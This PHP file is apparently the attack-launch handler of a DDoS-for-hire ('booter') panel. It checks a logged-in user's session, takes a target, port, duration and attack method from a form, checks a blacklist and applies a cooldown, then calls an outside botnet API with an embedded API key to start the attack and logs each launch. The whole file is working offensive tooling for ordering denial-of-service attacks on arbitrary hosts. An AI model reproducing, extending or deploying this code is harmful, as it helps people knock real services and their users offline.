<?php
    session_start();

    if ($_SESSION['botnet_access'] != 1 || !isset($_SESSION['authkey'])) {
        header('Location: index.php');
        exit;
    }

    require "inc/main_funcs.php";
    require "inc/sql_connect.php";
    require "inc/sql_funcs.php";

    function botnet_api_error($message)
    {
        $_SESSION['error_style'] = 0;
        $_SESSION['error_message'] = $message;
        header('Location: botnet.php');
        exit;
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $target = filter_var($_POST['enter_target'], FILTER_SANITIZE_STRING);
        $port = filter_var($_POST['enter_port'], FILTER_VALIDATE_INT);
        $time = filter_var($_POST['enter_time'], FILTER_VALIDATE_INT);
        $method = filter_var($_POST['attackMethod'], FILTER_SANITIZE_STRING);

        // Sprawdza kurwa blackliste
        $blacklistedUsers = fetchRecords($conn, "botnet_blacklist", "target", $target);
        if (!empty($blacklistedUsers)) {
            $_SESSION['error_style'] = 0;
            $_SESSION['error_message'] = "This target is blacklisted.";
            header('Location: botnet.php');
            exit();
        }

        // Attack delay
        if($_SESSION['last_boot'] + 80 > time() && $_SESSION['admin'] <= 0) {
            $wait_time = $_SESSION['last_boot'] + 80 - time();
            botnet_api_error("You have delay for ".$wait_time." seconds");
        }

        // Port and Time validation
        if ($port === false || $port < 1 || $port > 65535) {
            botnet_api_error("Invalid port number (1-65535)");
        }
        if ($time === false || $time < 1 || $time > 60) {
            botnet_api_error("Invalid attack duration (1-60 seconds)");
        }

        $url = "https://api.tsuki.army/v2/start?api_key=tsuki-army-nyaadhhd&user=6643&target=".$target."&time=".$time."&method=".$method."&port=".$port."";
        $options = array(
            'http' => array(
                'header' => "User-Agent: Mozilla/5.0\r\n" // Dodajemy nag³ówek User-Agent
            )
        );
        $context = stream_context_create($options);

        $api_response = file_get_contents($url, false, $context);

        if ($api_response === false) {
            botnet_api_error("API Request Failed");
        }

        $api_data = json_decode($api_response, true);
        if ($api_data !== null) {
            $status = $api_data['status'];
            $ret_data = $api_data['message'];

            if($status) {
                // Logs
                $logsData = [
                    'user' => $_SESSION['username'],
                    'target' => $target,
                    'port' => $port,
                    'time' => $time,
                    'method' => $method
                ];
                addNewRecord($conn, 'botnet_logs', $logsData);

                $_SESSION['last_boot'] = time();

                $_SESSION['error_style'] = 1;
                $_SESSION['error_message'] = $ret_data;
                header('Location: botnet.php');

                exit;
            } else {
                botnet_api_error($ret_data);
            }
        }
    }
?>
